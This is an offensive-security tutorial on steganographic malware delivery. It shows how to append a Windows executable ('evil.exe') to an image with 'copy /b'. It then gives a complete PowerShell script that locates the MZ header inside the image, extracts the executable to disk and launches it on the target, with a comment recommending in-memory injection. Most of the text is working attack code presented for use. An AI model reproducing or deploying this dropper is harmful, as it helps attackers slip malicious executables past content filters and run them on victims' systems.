# Steganography: JPG/PNG + PE

In this technique, we embed our PE file into an arbitrary image file and transfer it to a target Windows system.  
Then extract the PE file from the image, and execute it.  

## 1. Embed Executable in Image File

At first, we embed our PE file into an image file. We can use the Command Prompt `copy` command because it is much easier.

```powershell
# (option 1) In Command Prompt
copy /b cat.jpg + evil.exe evil.jpg

# (option 2) In PowerShell, we cannot use the `copy` command directly
# because the PowerShell `copy` command is an aliase for the `Copy-Item` cmdlet. So use `cmd /c copy`.
cmd /c copy /b cat.jpg + evil.exe evil.jpg
```

After executing the command above, the `evil.jpg` file is generated. Transfer this file to a target Windows machine.

## 2. Extract the Executable and Execute It

In a target Windows machine, we extract our PE from the `evil.jpg`, then execute it.  
To do that, we find the beginning position of PE data from the image file, and extract it from that position.  Then write the bytes to a file as EXE.  
The PowerShell commands are below:

```powershell
# Replace the values with your own paths.
$imagePath = "C:\Path\To\evil.jpg" # the image file path embedded our executable
$outputPath = "C:\Path\To\evil.exe" # the output path of the executable which will be extracted and execute.

# Read an image file as bytes
$bytes = [System.IO.File]::ReadAllBytes($imagePath)

# Bytes pattern to find the begging position of PE.
$pattern = @(
    # MZ (0x4D5A) + subsequent bytes (0x90~)
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00
)

# Find the begging position of PE
$patternFound = $null
for ($i = 0; $i -le $bytes.Length - $pattern.Length; $i++) {
    $match = $true
    for ($j = 0; $j -lt $pattern.Length; $j++) {
        if ($bytes[$i + $j] -ne $pattern[$j]) {
            $match = $false
            break
        }
    }
    if ($match) {
        $patternFound = $i
        break
    }
}

# If the position found, extract it and execute.
if ($patternFound -ne $null) {
    $exeBytes = $bytes[$patternFound..($bytes.Length - 1)]
    # Save as a PE file however it would be better to use injection techniques or something else instead of outputting a file.
    [System.IO.File]::WriteAllBytes($outputPath, $exeBytes)
    Start-Process $outputPath
}
```

## Resources

- [Stegomalware Identifying Possible Attack Vectors](https://cyble.com/blog/stegomalware-identifying-possible-attack-vectors/)
